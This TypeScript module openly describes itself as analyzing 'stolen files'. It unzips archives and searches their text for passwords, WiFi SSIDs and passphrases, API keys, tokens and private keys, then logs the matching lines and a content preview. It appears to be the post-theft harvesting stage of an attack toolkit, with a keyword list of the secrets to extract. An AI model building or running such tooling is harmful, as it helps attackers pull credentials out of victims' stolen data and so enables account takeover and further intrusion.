/**
 * File Analyzer Module
 * Analyzes stolen files for sensitive information like passwords, WiFi credentials, etc.
 */

import AdmZip from 'adm-zip';
import * as fs from 'fs';
import * as path from 'path';

// Sensitive keywords to search for (from AGENT.md cite: 21)
const SENSITIVE_KEYWORDS = [
    'password',
    'passwd',
    'pwd',
    'ssid',
    'wpa_psk',
    'psk',
    'wpa_passphrase',
    'secret',
    'api_key',
    'apikey',
    'token',
    'credential',
    'private_key',
    'auth',
];

export interface SensitiveMatch {
    keyword: string;
    line: number;
    context: string; // The line containing the match
}

export interface AnalysisResult {
    filename: string;
    size: number;
    isZip: boolean;
    extractedFiles?: string[];
    sensitiveData: SensitiveMatch[];
    rawContent?: string; // First 500 chars for preview
    analyzedAt: Date;
}

/**
 * Check if a buffer represents a ZIP file
 */
function isZipBuffer(buffer: Buffer): boolean {
    // ZIP magic number: PK (0x50 0x4B)
    return buffer.length >= 2 && buffer[0] === 0x50 && buffer[1] === 0x4b;
}

/**
 * Analyze text content for sensitive keywords
 */
function analyzeTextContent(content: string): SensitiveMatch[] {
    const matches: SensitiveMatch[] = [];
    const lines = content.split('\n');

    lines.forEach((line, index) => {
        const lowerLine = line.toLowerCase();

        for (const keyword of SENSITIVE_KEYWORDS) {
            if (lowerLine.includes(keyword)) {
                matches.push({
                    keyword,
                    line: index + 1,
                    context: line.trim().substring(0, 200), // Limit context length
                });
            }
        }
    });

    return matches;
}

/**
 * Analyze a ZIP file and extract contents for analysis
 */
function analyzeZipContent(buffer: Buffer): { extractedFiles: string[]; sensitiveData: SensitiveMatch[]; combinedContent: string } {
    const zip = new AdmZip(buffer);
    const entries = zip.getEntries();
    const extractedFiles: string[] = [];
    let allSensitiveData: SensitiveMatch[] = [];
    let combinedContent = '';

    for (const entry of entries) {
        if (!entry.isDirectory) {
            extractedFiles.push(entry.entryName);

            try {
                const content = entry.getData().toString('utf-8');
                combinedContent += `\n--- ${entry.entryName} ---\n${content}`;

                const matches = analyzeTextContent(content);
                // Tag matches with the source file
                const taggedMatches = matches.map(m => ({
                    ...m,
                    context: `[${entry.entryName}] ${m.context}`,
                }));
                allSensitiveData = allSensitiveData.concat(taggedMatches);
            } catch {
                // Binary file or encoding issue, skip
                console.log(`⚠️  Could not read entry as text: ${entry.entryName}`);
            }
        }
    }

    return { extractedFiles, sensitiveData: allSensitiveData, combinedContent };
}

/**
 * Main analysis function - analyzes a file (text or ZIP)
 */
export async function analyzeFile(filePath: string): Promise<AnalysisResult> {
    const filename = path.basename(filePath);
    const stats = fs.statSync(filePath);
    const buffer = fs.readFileSync(filePath);

    const result: AnalysisResult = {
        filename,
        size: stats.size,
        isZip: false,
        sensitiveData: [],
        analyzedAt: new Date(),
    };

    if (isZipBuffer(buffer)) {
        result.isZip = true;
        console.log(`📦 Detected ZIP file: ${filename}`);

        try {
            const zipAnalysis = analyzeZipContent(buffer);
            result.extractedFiles = zipAnalysis.extractedFiles;
            result.sensitiveData = zipAnalysis.sensitiveData;
            result.rawContent = zipAnalysis.combinedContent.substring(0, 500);
        } catch (err) {
            console.error(`❌ Failed to analyze ZIP: ${err}`);
        }
    } else {
        // Treat as text file
        console.log(`📄 Analyzing text file: ${filename}`);
        const content = buffer.toString('utf-8');
        result.sensitiveData = analyzeTextContent(content);
        result.rawContent = content.substring(0, 500);
    }

    // Log findings
    if (result.sensitiveData.length > 0) {
        console.log(`🚨 ALERT: Found ${result.sensitiveData.length} sensitive data matches!`);
        result.sensitiveData.forEach(match => {
            console.log(`   🔑 [${match.keyword}] Line ${match.line}: ${match.context.substring(0, 80)}...`);
        });
    } else {
        console.log(`✅ No sensitive keywords found in ${filename}`);
    }

    return result;
}

/**
 * Analyze buffer directly without saving to disk first
 */
export function analyzeBuffer(buffer: Buffer, filename: string): AnalysisResult {
    const result: AnalysisResult = {
        filename,
        size: buffer.length,
        isZip: false,
        sensitiveData: [],
        analyzedAt: new Date(),
    };

    if (isZipBuffer(buffer)) {
        result.isZip = true;
        try {
            const zipAnalysis = analyzeZipContent(buffer);
            result.extractedFiles = zipAnalysis.extractedFiles;
            result.sensitiveData = zipAnalysis.sensitiveData;
            result.rawContent = zipAnalysis.combinedContent.substring(0, 500);
        } catch (err) {
            console.error(`❌ Failed to analyze ZIP buffer: ${err}`);
        }
    } else {
        const content = buffer.toString('utf-8');
        result.sensitiveData = analyzeTextContent(content);
        result.rawContent = content.substring(0, 500);
    }

    return result;
}
